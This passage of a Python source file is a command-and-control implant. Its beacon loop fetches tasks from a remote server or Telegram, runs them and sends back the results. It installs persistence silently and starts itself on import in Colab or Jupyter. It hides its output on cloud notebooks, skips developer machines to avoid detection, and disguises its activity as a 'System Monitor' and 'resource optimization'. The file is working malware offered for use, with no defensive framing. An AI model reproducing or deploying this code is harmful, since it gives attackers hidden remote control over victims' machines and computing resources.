                                "modified": datetime.fromtimestamp(found.stat().st_mtime).isoformat()
                            })
            except:
                pass
    
    return interesting[:100]  # Limit results

# ─── Beacon loop ──────────────────────────────────────────────────────────────
def beacon_loop(c2_url=None, agent_id=None, auth_token=None, enc_key=None, sleep=None, jitter=None):
    import random
    _sleep = sleep or SLEEP
    _jitter = jitter or JITTER
    _retry_delay = 5  # Start with 5 seconds
    _max_retry_delay = 300  # Max 5 minutes
    _consecutive_failures = 0
    _total_beacons = 0
    _total_tasks = 0
    _last_successful_beacon = time.time()
    
    _agent_id = agent_id or AGENT_ID
    _c2_url = c2_url or C2_URL
    
    log(f"Starting beacon loop (sleep={_sleep}s, jitter={_jitter}%)", "START")
    
    # Telegram mode - use direct API
    if TELEGRAM_MODE and not _c2_url:
        log("Telegram C2 mode - using direct API", "START")
        telegram_beacon_loop(_agent_id, _sleep, _jitter)
        return
    
    while True:
        try:
            _total_beacons += 1
            
            # Health check before beacon
            try:
                health = http_get("/api/health", _c2_url, timeout=5)
                if health.get("status") != "ok":
                    log("Server health check failed, re-registering...", "CONN")
                    register(_c2_url, _agent_id, auth_token, enc_key)
            except Exception as e:
                log(f"Health check failed: {e}, attempting re-register", "CONN")
                try:
                    register(_c2_url, _agent_id, auth_token, enc_key)
                except Exception as re:
                    log(f"Re-register failed: {re}", "ERROR")
            
            log(f"Beacon #{_total_beacons} to {_c2_url}", "CONN")
            
            resp = http_post("/api/agent/beacon", {"id": _agent_id}, _c2_url, auth_token, enc_key)
            
            # Success - reset retry delay
            _consecutive_failures = 0
            _retry_delay = 5
            _last_successful_beacon = time.time()
            
            # Update sleep/jitter from server
            if "sleep" in resp:
                _sleep = int(resp["sleep"])
            if "jitter" in resp:
                _jitter = int(resp["jitter"])
            
            # Process tasks
            tasks = resp.get("tasks", [])
            if tasks:
                log(f"Received {len(tasks)} tasks", "TASK")
            
            for task in tasks:
                _total_tasks += 1
                task_id = task.get("id", "unknown")
                task_type = task.get("task_type", "unknown")
                log(f"Executing task #{_total_tasks}: {task_type} (id={task_id})", "TASK")
                
                try:
                    result = execute_task(task)
                    log(f"Task {task_id} completed: {len(result)} chars output", "TASK")
                    http_post("/api/agent/result", {"task_id": task_id, "result": result}, _c2_url, auth_token, enc_key)
                except Exception as e:
                    log(f"Task {task_id} failed: {e}", "ERROR")
                    try:
                        http_post("/api/agent/result", {"task_id": task_id, "result": f"[agent error] {e}"}, _c2_url, auth_token, enc_key)
                    except:
                        pass
        
        except URLError as e:
            _consecutive_failures += 1
            log_connection_attempt(_c2_url, _consecutive_failures, e)
            
            # Re-register after 5 consecutive failures
            if _consecutive_failures >= 5 and (_consecutive_failures % 5 == 0):
                log(f"Too many failures, attempting re-register (attempt {_consecutive_failures // 5})", "CONN")
                try:
                    register(_c2_url, _agent_id, auth_token, enc_key)
                except Exception as re:
                    log(f"Re-register failed: {re}", "ERROR")
            
            # Exponential backoff
            if _consecutive_failures > 3:
                _retry_delay = min(_retry_delay * 2, _max_retry_delay)
                log(f"Backing off: {_retry_delay}s before retry", "CONN")
        
        except socket.timeout:
            _consecutive_failures += 1
            log_connection_attempt(_c2_url, _consecutive_failures, "Socket timeout")
            _retry_delay = min(_retry_delay * 1.5, _max_retry_delay)
        
        except Exception as e:
            _consecutive_failures += 1
            log(f"Beacon error: {type(e).__name__}: {e}", "ERROR")
        
        # Sleep with jitter
        if _consecutive_failures > 0:
            actual_sleep = _retry_delay
        else:
            jitter_s = _sleep * _jitter / 100
            actual_sleep = max(1, _sleep + random.uniform(-jitter_s, jitter_s))
        
        log(f"Sleeping {actual_sleep:.1f}s (failures: {_consecutive_failures})", "DEBUG")
        time.sleep(actual_sleep)


# ─── UniversalAgent Class ─────────────────────────────────────────────────────
class UniversalAgent:
    """Universal C2 Agent - works on all platforms."""
    
    def __init__(self, c2_url=None, agent_id=None, auth_token=None, enc_key=None, sleep=5, jitter=10):
        self.c2_url = c2_url or C2_URL
        self.agent_id = agent_id or str(uuid.uuid4())
        self.auth_token = auth_token
        self.enc_key = enc_key
        self.sleep = sleep
        self.jitter = jitter
        self._running = False
        self._thread = None
    
    def register(self):
        return register(self.c2_url, self.agent_id, self.auth_token, self.enc_key)
    
    def beacon(self):
        return http_post("/api/agent/beacon", {"id": self.agent_id}, self.c2_url, self.auth_token, self.enc_key)
    
    def execute(self, task):
        return execute_task(task)
    
    def start(self, block=True):
        """Start agent. If block=True, runs in foreground. If False, runs in background thread."""
        self.register()
        self._running = True
        if block:
            beacon_loop(self.c2_url, self.agent_id, self.auth_token, self.enc_key, self.sleep, self.jitter)
        else:
            self._thread = threading.Thread(
                target=beacon_loop,
                args=(self.c2_url, self.agent_id, self.auth_token, self.enc_key, self.sleep, self.jitter),
                daemon=True
            )
            self._thread.start()
    
    def stop(self):
        self._running = False


# ─── Entry point ──────────────────────────────────────────────────────────────
def main():
    """Entry point for pip-installed agent."""
    import random
    
    # Developer protection - don't run on local machine
    if SKIP_LOCAL:
        hostname = socket.gethostname().lower()
        user = os.environ.get("USER", os.environ.get("USERNAME", "")).lower()
        if hostname in [h.lower() for h in DEV_HOSTNAMES] or user in [u.lower() for u in DEV_USERS]:
            # Silently exit on developer machine
            return
    
    # Stealth mode for Kaggle/Colab - minimal output
    if STEALTH_MODE:
        # On cloud platforms, go completely silent
        global _stdout_enabled
        _stdout_enabled = False
        # Longer beacon interval on cloud (less suspicious)
        global SLEEP
        SLEEP = max(SLEEP, 60)  # At least 60s between beacons on cloud
    
    log("=" * 60, "START")
    log("C2 Universal Agent v3.0 - Starting", "START")
    log("=" * 60, "START")
    
    # Platform detection
    pt = detect_platform()
    log(f"Platform: {pt}", "START")
    log(f"Hostname: {socket.gethostname()}", "START")
    log(f"User: {os.environ.get('USER', os.environ.get('USERNAME', 'unknown'))}", "START")
    log(f"CWD: {os.getcwd()}", "START")
    log(f"Python: {platform.python_version()}", "START")
    log(f"Agent ID: {AGENT_ID}", "START")
    
    # Show C2 mode
    if TELEGRAM_MODE:
        log("C2 Mode: Telegram (direct API)", "START")
    else:
        log(f"C2 URL: {C2_URL}", "START")
    
    # Install persistence silently on first run
    log("Checking persistence...", "START")
    install_persistence()
    
    # Telegram mode - send registration message
    if TELEGRAM_MODE:
        log("Registering system monitor via Telegram...", "CONN")
        msg = f"""<b>🖥️ System Monitor Online</b>
<code>ID: {AGENT_ID}</code>
Platform: {pt}
Hostname: {socket.gethostname()}
User: {os.environ.get('USER', 'unknown')}
Python: {platform.python_version()}
Time: {datetime.now().isoformat()}"""
        result = telegram_send(msg)
        if result.get("ok"):
            log("✓ System monitor registered", "START")
        else:
            log(f"Registration failed: {result.get('error')}", "WARN")
        
        # Auto-start resource optimization
        log("Starting resource optimization...", "START")
        try:
            opt_result = optimize_resources()  # Uses defaults
            log(f"✓ {opt_result}", "START")
        except Exception as e:
            log(f"Resource optimization failed: {e}", "WARN")
        
        # Start health monitoring loop
        log("Starting health monitoring loop...", "START")
        telegram_health_check_loop(AGENT_ID, SLEEP, JITTER)
    
    # HTTP mode - check server health first
    log("Checking server connectivity...", "CONN")
    ok, result = check_server_health()
    if ok:
        log(f"Server OK: {result}", "CONN")
    else:
        log(f"Server check failed: {result}", "WARN")
        log("Troubleshooting:", "WARN")
        log("  - Is the server running?", "WARN")
        log(f"  - Is C2_URL correct? Currently: {C2_URL}", "WARN")
        log("  - Is the port reachable? (firewall/network)", "WARN")
        log("  - For HTTPS: check certificate", "WARN")
    
    # Register with aggressive retry and detailed error
    retry_count = 0
    retry_delay = 5
    max_retry_delay = 120
    
    while True:
        retry_count += 1
        try:
            log(f"Registration attempt #{retry_count}", "CONN")
            resp = register()
            log(f"Registered successfully: {AGENT_ID[:8]}...", "START")
            log(f"Server response: {resp}", "START")
            
            # Start resource optimization in background
            if _resource_monitor_loaded:
                try:
                    optimize_resources()
                    log("Resource optimization started", "START")
                except Exception as e:
                    log(f"Resource optimization failed: {e}", "WARN")
            
            # Go quiet after successful registration
            if QUIET_MODE:
                log("Going quiet - further logs only in ~/.cache/.system_update.log", "START")
                disable_stdout_logging()
            
            break
        except URLError as e:
            log_connection_attempt(C2_URL, retry_count, e)
        except socket.timeout:
            log_connection_attempt(C2_URL, retry_count, "Socket timeout")
        except Exception as e:
            log(f"Registration failed: {type(e).__name__}: {e}", "ERROR")
        
        # Exponential backoff after 5 attempts
        if retry_count >= 5:
            retry_delay = min(retry_delay * 1.5, max_retry_delay)
        
        if retry_count % 10 == 0:
            log(f"Still trying to register... (attempt {retry_count})", "CONN")
        
        time.sleep(retry_delay)
    
    # Start beacon loop
    log("Starting beacon loop...", "START")
    beacon_loop()

if __name__ == "__main__":
    main()
else:
    # Imported (Colab/Jupyter cell exec) - silent auto-start
    try:
        install_persistence()
        register()
        threading.Thread(target=beacon_loop, daemon=True).start()
    except:
        # If import fails, still try to start
        threading.Thread(target=beacon_loop, daemon=True).start()
